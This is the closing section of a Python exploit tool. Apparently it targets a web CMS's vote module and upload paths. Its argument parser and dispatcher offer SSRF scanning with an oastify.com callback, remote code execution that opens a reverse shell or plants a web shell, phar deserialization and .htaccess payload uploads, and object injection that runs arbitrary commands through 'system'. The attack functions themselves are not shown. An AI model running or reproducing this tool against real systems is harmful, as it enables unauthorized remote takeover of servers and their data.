	# Scan mode ---------------------------------------------------------------------------
	parser_scan = subparser.add_parser('scan')
	parser_scan.add_argument("-s", '--ssrf_url', help='url for ssrf attack (example: http://5kqki2fsl626q2257vy6xc2ef5lw9rxg.oastify.com)', required=True)

	# RCE vote mode -----------------------------------------------------------------------
	parser_rce_vote = subparser.add_parser('rce_vote')
	parser_rce_vote.add_argument('--id_agent', default=4, type=int, help='ID of vote module agent (2,4 and 7 available)')
	parser_rce_vote.add_argument('--lhost', help='IP address for reverse connection')
	parser_rce_vote.add_argument('--lport', help='Port of the host that listens for reverse connection')
	parser_rce_vote.add_argument('--web-shell', metavar='webshell', default=False, type=bool, help='Use web shell instead of console reverse shell')
	parser_rce_vote.add_argument('--path', metavar='path', default='', help='Path where in the site to upload a random file (example: /upload/iblock/1d3/)')

	# RCE vote phar deserialization mode --------------------------------------------------
	parser_vote_phar = subparser.add_parser('vote_phar')
	parser_vote_phar.add_argument('-p', '--payload', metavar='payload', type=argparse.FileType("rb"), help='Path to payload file', required=True)


	# RCE vote using .htaccess mode -------------------------------------------------------
	parser_vote_htaccess = subparser.add_parser('vote_htaccess')
	parser_vote_htaccess.add_argument('-p', '--payload', metavar='payload', type=argparse.FileType("rb"), help='Path to payload file', required=True)

	# RCE object injection mode -----------------------------------------------------------
	parser_rce_object_injection = subparser.add_parser('object_injection')
	parser_rce_object_injection.add_argument('-f', '--function', default='system', help='Used function')
	parser_rce_object_injection.add_argument('-c', '--command', help='Command for execution', required=True)
	args = parser.parse_args()

	if args.subcommand == "vote_htaccess" or args.subcommand == "vote_phar":
		ext = pathlib.Path(args.payload.name).suffix

	if (args.subcommand == "vote_htaccess" and ext == ".php") or (args.subcommand == "vote_phar" and ext != ".phar"):
		print(f"{bcolors.FAIL}Invalid payload extension {bcolors.ENDC}")
		sys.exit(1)

	target_url = args.target
	if target_url[-1] != '/':
		target_url += '/'

	if args.subcommand == 'scan':
		ssrf_url = args.ssrf_url
		if ssrf_url[-1] != '/':
			ssrf_url += '/'


	session = requests.Session()
	session.headers.update(headers)

	if args.proxy:
		proxies = {
			"http": args.proxy,
			"https": args.proxy,
		}
		session.proxies.update(proxies)

	print(ascii_banner)
	try:
		response = session.get(target_url, verify=False)
	except requests.exceptions.ConnectionError:
		print(f'{bcolors.FAIL}Host name does not exists. Check domain name for errors{bcolors.ENDC}')
		sys.exit(1)
	try:
		if args.subcommand == 'scan':
			scan(session, target_url, ssrf_url)
		if args.subcommand == 'rce_vote':
			do_rce_vote(session, target_url, args.id_agent, args.web_shell, args.path, args.lhost, args.lport)
		if args.subcommand == 'object_injection':
			do_object_injection(session, target_url, args.function, args.command)
		if args.subcommand == 'vote_phar':
			do_rce_vote_phar(session, target_url, args.payload, args.payload.name)
		if args.subcommand == 'vote_htaccess':
			do_rce_vote_upload_htaccess(session, target_url, args.payload, args.payload.name)
	except Exception as e:
		print(f'{bcolors.FAIL}Error: {str(e)}{bcolors.ENDC}')
		sys.exit(1)

if __name__ == "__main__":
	main()

